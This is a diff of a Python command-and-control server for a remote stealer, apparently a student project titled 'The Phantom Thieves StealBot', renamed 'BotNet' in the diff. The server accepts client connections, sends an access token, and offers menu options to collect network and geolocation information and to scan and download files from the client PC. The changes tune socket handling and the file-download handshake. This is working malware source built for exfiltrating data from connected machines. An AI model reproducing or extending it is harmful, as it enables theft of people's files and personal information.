@@ -54,9 +54,9 @@ import pyfiglet
 from hurry.filesize import size
 
 # attributi globali
-Port = 9091
-IpAddr = "192.168.1.169"
-s = socket.socket()
+Port = 58131                                                                             #____________
+IpAddr = "192.168.1.154"#da far diventare statico se il professore ci da l'ip #        |192.168.1.75|
+s = socket.socket()                                                                    # ------------
 access_token = '0ffd6eb3150512'
 
 
@@ -76,13 +76,14 @@ def MenuClient():
     print("5)Get Network Information")
     print("6)Get Geolocalization Information")
     print("7)Scan Files on client pc")
+    print("8)Close Connection")
 
     resp = ''
     try:
         resp = int(input())
     except ValueError:
         print("Inserisci un numero valido")
-    if 0 < resp < 8:
+    if 0 < resp < 9:
         return resp
     else:
         print("Inserisci un numero valido")
@@ -93,11 +94,16 @@ def cosaFareInizialmente(client) -> bool:
     if response == 7:
         client.send("7".encode())
         retrievalOperations(client)
+    elif response == 8:
+        pass
     else:
         # inviare normalmente le richieste
         OttieniInformazioni(client, response)
 
     if CloseConnection():
+        client.send("quit".encode())
+        time.sleep(1)
+        client.shutdown(socket.SHUT_RDWR)
         client.close()
         return False
     else:
@@ -113,8 +119,9 @@ def retrievalOperations(client):
         return
     else:
         client.send("not quit".encode("utf-8"))
+    time.sleep(5)
     client.send(found_files)
-    time.sleep(3)
+    time.sleep(5)#afterrecvall
     client.send(files_by_number)
     downloaderFunction(client)
 
@@ -149,6 +156,7 @@ def CreaSocket():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         print("Socket Successfully created")
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     except socket.error as e:
         s.close()
         logging.error(e)
@@ -168,9 +176,9 @@ def Listen():
     global s
     try:
         print("Now in listening...")
-        s.listen(5)
         client, address = s.accept()
         print(f"Connessione accettata con {client.getpeername()}")
+        time.sleep(5)
         client.send(str(access_token).encode())
         return client, address
     except Exception as e:
@@ -180,17 +188,18 @@ def Listen():
 
 
 def ConnectionMenu() -> bool:
-    print("Do you want to accept other connections?")
-    print("1)Yes")
-    print("2)No")
-    risposta = input()
-    if risposta == '1':
-        return False
-    elif risposta == '2':
-        return True
-    else:
-        return ConnectionMenu()
-
+    esci = True
+    while esci:
+        print("Do you want to accept other connections?")
+        print("1)Yes")
+        print("2)No")
+        risposta = input()
+        if risposta == '1':
+            return False
+        elif risposta == '2':
+            return True
+        else:
+            pass
 
 def main():
     esisteclient = False
@@ -198,13 +207,12 @@ def main():
 
     CreaSocket()
     CreaBind()
-
+    s.listen(5)
     while not esisteclient:
         client, _ = Listen()
-        # client trovato
+        connessioneclient = True
         while connessioneclient:
             connessioneclient = cosaFareInizialmente(client)
-
         esisteclient = ConnectionMenu()
     s.close()
 
@@ -306,6 +314,7 @@ def downloaderFunction(client_object):
     number_of_files = int(number_of_files)
     for i in range(0, number_of_files):
         file_size = client_object.recv(1024).decode("utf-8")
+        client_object.send("procedi".encode("utf-8"))
         file_name = client_object.recv(1092).decode("utf-8", "ignore")
         file_name = os.path.basename(file_name)
         client_object.send("ho ricevuto il file-name".encode("utf-8"))
@@ -321,10 +330,12 @@ def downloaderFunction(client_object):
 
 
 def recvall(sock):
-    BUFF_SIZE = 4096
+    BUFF_SIZE = 8192
     data = b''
     while True:
+        time.sleep(1.5)
         part = sock.recv(BUFF_SIZE)
+        print(f"Leggo {BUFF_SIZE} byte")
         data += part
         if len(part) < BUFF_SIZE:
             break  # 0 bit da scaricare o end of file
@@ -336,6 +347,7 @@ def recvall2(sock, file_size: int):
     n = 0
     data = b''
     while True:
+        time.sleep(0.5)
         n += 1
         if file_size > 4096:
             print(f"\rScarico {size(n * BUFF_SIZE)}/{size(file_size)} parts downloaded", end='')
@@ -353,7 +365,7 @@ def signal_handler(signal, frame):
 
 
 def groupText():
-    print(pyfiglet.figlet_format("The Phantom Thieves StealBot"))
+    print(pyfiglet.figlet_format("The Phantom Thieves BotNet"))
 
 
 def Phantom():
